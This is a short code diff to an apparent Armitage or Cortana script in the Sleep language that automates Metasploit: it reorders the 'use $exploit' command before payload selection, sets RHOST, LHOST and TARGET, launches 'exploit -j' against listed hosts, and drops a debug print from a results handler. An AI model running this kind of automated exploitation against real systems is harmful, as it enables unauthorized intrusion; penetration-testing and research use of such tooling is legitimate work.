@@ -171,6 +171,8 @@ on launch_attacks {
          $os = split('/', $name)[0];
          $exploit = "exploit/" . $name;
 
+         cmd($console, "use $exploit");
+
          if ($payload eq "") {
             $payload = determinePayload($os);
          }
@@ -179,7 +181,6 @@ on launch_attacks {
             cmd($console, "set payload " . $payload);
          }
 
-         cmd($console, "use $exploit");
          cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));
          cmd($console, "exploit -j");
       
@@ -250,7 +251,6 @@ on noSessions {
    %exp_run = $3;
 
    foreach $host (@hosts) {
-      println(%exploits);
       $numRun = %exp_run[$host];
       println("$host" . ",false,0,0,0,0,0," . "$numRun");
       for ($i = 0; $i < 2; $i++) {
